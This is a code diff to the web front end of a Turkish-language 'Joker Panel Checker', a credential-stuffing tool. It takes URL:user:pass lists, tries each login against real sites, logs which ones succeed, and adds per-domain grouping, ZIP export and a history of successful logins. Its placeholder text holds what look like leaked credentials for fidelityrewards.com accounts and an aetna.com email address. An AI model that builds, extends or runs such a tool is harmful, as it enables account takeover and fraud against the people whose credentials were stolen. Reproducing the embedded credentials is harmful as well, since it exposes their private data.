@@ -12,6 +12,15 @@
         textarea { width: 100%; font-family: monospace; padding: 12px; border-radius: 12px; border: 1px solid #ccc; font-size: 14px; }
         button { background: #1e466e; color: white; border: none; padding: 8px 18px; border-radius: 30px; cursor: pointer; margin-right: 10px; }
         button:hover { background: #0f2c46; }
+        button.secondary { background: #35665c; }
+        button.secondary:hover { background: #224a42; }
+        button.danger { background: #7d2d2d; }
+        button.danger:hover { background: #561b1b; }
+        input { width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #ccc; font-size: 14px; }
+        .hidden { display: none; }
+        .auth-card { max-width: 430px; margin: 80px auto; }
+        .topbar { display: flex; align-items: center; justify-content: space-between; gap: 16px; margin-bottom: 20px; }
+        .badge { background: #e8eef6; color: #1e466e; padding: 6px 10px; border-radius: 999px; font-size: 12px; font-weight: 700; }
         .split { display: flex; gap: 24px; margin-top: 20px; flex-wrap: wrap; }
         .table-panel { flex: 2; }
         .logs-panel { flex: 1; background: #1e1e2f; border-radius: 16px; padding: 12px; color: #cfd7ff; height: 550px; overflow-y: auto; display: flex; flex-direction: column-reverse; font-family: monospace; font-size: 13px; }
@@ -30,21 +39,40 @@
 </head>
 <body>
 <div class="container">
+    <div class="card auth-card" id="loginCard">
+        <h2>🔐 Giriş</h2>
+        <label><b>Kullanıcı adı</b></label>
+        <input id="loginUsername" autocomplete="username" placeholder="admin veya user">
+        <div style="height: 12px;"></div>
+        <label><b>Şifre</b></label>
+        <input id="loginPassword" type="password" autocomplete="current-password" placeholder="Şifre">
+        <div style="margin-top: 15px;">
+            <button onclick="login()">GİRİŞ YAP</button>
+        </div>
+        <div class="note" id="loginNote"></div>
+    </div>
+
+    <div id="appRoot" class="hidden">
+    <div class="topbar">
+        <div>
+            <span class="badge" id="roleBadge"></span>
+            <span id="userLabel"></span>
+        </div>
+        <button class="danger" onclick="logout()">ÇIKIŞ</button>
+    </div>
+
     <div class="card">
         <h2>🔐 Joker Panel Checker </h2>
         <div class="flex">
             <div class="col">
-                <label><b>🌐 Base URL listesi (opsiyonel)</b></label>
-                <textarea id="baseUrls" rows="4" placeholder="https://login.fidelityrewards.com/onlineCard/login.do&#10;https://fidelityrewards.com/login"></textarea>
-            </div>
-            <div class="col">
-                <label><b>🔑 Kullanıcı:Şifre listesi</b><br>
-                <small>Format: url:user:pass veya user:pass</small></label>
-                <textarea id="creds" rows="8" placeholder="https://fidelityrewards.com:barraganjudie@aetna.com:zdjoi973J0ERz&#10;95009:s4978600tf&#10;sugarplum81:Cos10pews_2010"></textarea>
+                <label><b>🔑 URL:Kullanıcı:Şifre listesi</b><br>
+                <small>Format: https://domain.com/login:user:pass</small></label>
+                <textarea id="creds" rows="10" placeholder="https://fidelityrewards.com:barraganjudie@aetna.com:zdjoi973J0ERz&#10;https://login.fidelityrewards.com/onlineCard/login.do:95009:s4978600tf&#10;https://example.com/login:sugarplum81:Cos10pews_2010"></textarea>
             </div>
         </div>
         <div style="margin-top: 15px;">
             <button onclick="startTest()">▶ BAŞLAT</button>
+            <button class="secondary" onclick="groupListByDomain()">▦ GRUPLA</button>
             <button onclick="clearAll()">🧹 TEMİZLE</button>
             <button onclick="downloadResults()">📥 İNDİR</button>
         </div>
@@ -63,14 +91,99 @@
         </div>
         <div class="logs-panel" id="logPanel"><div>⏳ Bekleniyor...</div></div>
     </div>
+
+    <div class="card">
+        <h3>📁 Geçmiş</h3>
+        <div style="margin-bottom: 12px;">
+            <button onclick="loadHistory('checks')">TÜM CHECK GEÇMİŞİ</button>
+            <button class="secondary" onclick="loadHistory('successful')">BAŞARILI GEÇMİŞ</button>
+        </div>
+        <div class="table-wrapper">
+            <table>
+                <thead>
+                    <tr><th>Kullanıcı</th><th>URL</th><th>Login</th><th>Şifre</th><th>Durum</th><th>Zaman</th></tr>
+                </thead>
+                <tbody id="historyBody"></tbody>
+            </table>
+        </div>
+    </div>
+    </div>
 </div>
 
 <script>
     const tbody = document.getElementById('tableBody');
     const logPanel = document.getElementById('logPanel');
+    const historyBody = document.getElementById('historyBody');
     let eventSource = null;
     let refreshTimer = null;
     let totalTests = 0;
+    let currentUser = null;
+
+    async function apiFetch(url, options = {}) {
+        const res = await fetch(url, options);
+        if (res.status === 401) {
+            showLogin();
+            throw new Error('Giriş gerekli.');
+        }
+        return res;
+    }
+
+    function showLogin() {
+        currentUser = null;
+        if (eventSource) eventSource.close();
+        document.getElementById('loginCard').classList.remove('hidden');
+        document.getElementById('appRoot').classList.add('hidden');
+    }
+
+    function showApp(user) {
+        currentUser = user;
+        document.getElementById('loginCard').classList.add('hidden');
+        document.getElementById('appRoot').classList.remove('hidden');
+        document.getElementById('roleBadge').textContent = user.role.toUpperCase();
+        document.getElementById('userLabel').textContent = user.username;
+    }
+
+    async function checkSession() {
+        const res = await fetch('/api/auth/me');
+        if (!res.ok) {
+            showLogin();
+            return;
+        }
+        const data = await res.json();
+        showApp(data.user);
+        connectLogStream();
+        await clearAll();
+        await refreshResults();
+        await loadHistory('successful');
+    }
+
+    async function login() {
+        const username = document.getElementById('loginUsername').value.trim();
+        const password = document.getElementById('loginPassword').value;
+        const note = document.getElementById('loginNote');
+        note.textContent = '';
+        const res = await fetch('/api/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password })
+        });
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok) {
+            note.textContent = data.error || 'Giriş başarısız.';
+            return;
+        }
+        document.getElementById('loginPassword').value = '';
+        showApp(data.user);
+        connectLogStream();
+        await clearAll();
+        await refreshResults();
+        await loadHistory('successful');
+    }
+
+    async function logout() {
+        await fetch('/api/auth/logout', { method: 'POST' });
+        showLogin();
+    }
 
     function connectLogStream() {
         if (eventSource) eventSource.close();
@@ -86,7 +199,7 @@
     }
 
     async function refreshResults() {
-        const res = await fetch('/api/results');
+        const res = await apiFetch('/api/results');
         const data = await res.json();
         tbody.innerHTML = '';
         data.forEach(r => {
@@ -109,14 +222,119 @@
     }
 
     function escapeHtml(str) {
-        if (!str) return '';
-        return str.replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m]));
+        if (str === null || str === undefined) return '';
+        return String(str).replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m]));
+    }
+
+    function getDomain(value) {
+        if (!value) return '';
+        try {
+            const raw = value.trim();
+            const normalized = raw.startsWith('http') ? raw : `https://${raw}`;
+            return new URL(normalized).hostname.replace(/^www\./, '').toLowerCase();
+        } catch {
+            return '';
+        }
+    }
+
+    function parseListForGrouping() {
+        const credLines = document.getElementById('creds').value
+            .split('\n')
+            .map(line => line.trim())
+            .filter(line => line && !line.startsWith('###'));
+
+        const items = [];
+        for (const line of credLines) {
+            const urlMatch = line.match(/^(https?:\/\/[^:]+):(.+)$/i);
+            if (urlMatch) {
+                const domain = getDomain(urlMatch[1]);
+                if (domain) {
+                    items.push({ domain, line });
+                    continue;
+                }
+            }
+
+            items.push({ domain: 'domainsiz', line });
+        }
+
+        return items;
+    }
+
+    function buildGroupedText(items) {
+        return getGroupsFromItems(items)
+            .map(group => `### ${group.domain} (${group.lines.length})\n${group.lines.join('\n')}`)
+            .join('\n\n');
+    }
+
+    function getGroupsFromItems(items) {
+        const groups = new Map();
+        items.forEach(item => {
+            if (!groups.has(item.domain)) groups.set(item.domain, []);
+            groups.get(item.domain).push(item.line);
+        });
+
+        return [...groups.entries()]
+            .sort(([a], [b]) => a.localeCompare(b))
+            .map(([domain, lines]) => ({ domain, lines }));
+    }
+
+    function downloadTextFile(filename, content) {
+        const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        link.remove();
+        URL.revokeObjectURL(url);
+    }
+
+    async function downloadGroupedZip(groups) {
+        const res = await apiFetch('/api/group-download', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ groups })
+        });
+        if (!res.ok) {
+            const err = await res.json().catch(() => ({}));
+            throw new Error(err.error || 'ZIP indirilemedi');
+        }
+        const blob = await res.blob();
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = 'domain-bazli-listeler.zip';
+        document.body.appendChild(link);
+        link.click();
+        link.remove();
+        URL.revokeObjectURL(url);
+    }
+
+    async function groupListByDomain() {
+        const items = parseListForGrouping();
+        if (!items.length) {
+            alert('Gruplanacak liste bulunamadı.');
+            return;
+        }
+
+        const groups = getGroupsFromItems(items);
+        const groupedText = buildGroupedText(items);
+        document.getElementById('creds').value = groupedText;
+
+        try {
+            await downloadGroupedZip(groups);
+            alert(`${groups.length} domain için liste gruplandı ve ZIP olarak indirildi.`);
+        } catch (err) {
+            downloadTextFile('domain-bazli-liste.txt', groupedText);
+            alert(`ZIP indirilemedi, gruplu TXT indirildi: ${err.message}`);
+        }
     }
 
     async function clearAll() {
         tbody.innerHTML = '';
         logPanel.innerHTML = '<div>🧹 Temizlendi - Yeni teste hazır</div>';
-        await fetch('/api/results', { method: 'DELETE' });
+        await apiFetch('/api/results', { method: 'DELETE' });
         if (refreshTimer) {
             clearInterval(refreshTimer);
             refreshTimer = null;
@@ -126,19 +344,18 @@
     }
 
     async function startTest() {
-        const baseUrls = document.getElementById('baseUrls').value;
         const creds = document.getElementById('creds').value;
         if (!creds.trim()) {
-            alert('Lütfen Kullanıcı:Şifre listesini doldurun.');
+            alert('Lütfen URL:Kullanıcı:Şifre listesini doldurun.');
             return;
         }
 
         await clearAll();
 
-        const res = await fetch('/api/start', {
+        const res = await apiFetch('/api/start', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ baseUrlsText: baseUrls, credsText: creds })
+            body: JSON.stringify({ credsText: creds })
         });
         if (!res.ok) {
             const err = await res.json();
@@ -148,7 +365,7 @@
         const json = await res.json();
         totalTests = json.total;
         window.popupShown = false;
-        alert(`Test başladı! Toplam ${totalTests} kombinasyon. Yazılan karakterleri net göreceksiniz.`);
+        alert(`Test başladı! Toplam ${totalTests} deneme sırayla çalışacak. Yazılan karakterleri net göreceksiniz.`);
 
         if (refreshTimer) clearInterval(refreshTimer);
         refreshTimer = setInterval(refreshResults, 1500);
@@ -159,10 +376,31 @@
         window.location.href = '/api/download';
     }
 
+    async function loadHistory(type) {
+        if (!currentUser) return;
+        const endpoint = type === 'checks' ? '/api/history/checks' : '/api/history/successful';
+        const res = await apiFetch(endpoint);
+        const data = await res.json();
+        historyBody.innerHTML = '';
+        if (!data.length) {
+            historyBody.innerHTML = '<tr><td colspan="6">Kayıt yok</td></tr>';
+            return;
+        }
+        data.forEach(item => {
+            const row = `<tr class="${item.success ? 'ok' : 'fail'}">
+                <td>${escapeHtml(item.ownerUsername || currentUser.username)}</td>
+                <td>${escapeHtml(item.url)}</td>
+                <td>${escapeHtml(item.username)}</td>
+                <td>${escapeHtml(item.passwordMasked)}</td>
+                <td>${item.success ? '✅ BAŞARILI' : '❌ BAŞARISIZ'}</td>
+                <td>${escapeHtml(new Date(item.createdAt || item.checkedAt).toLocaleString())}</td>
+            </tr>`;
+            historyBody.insertAdjacentHTML('beforeend', row);
+        });
+    }
+
     window.onload = async () => {
-        await clearAll();
-        connectLogStream();
-        refreshResults();
+        await checkSession();
     };
 </script>
 </body>
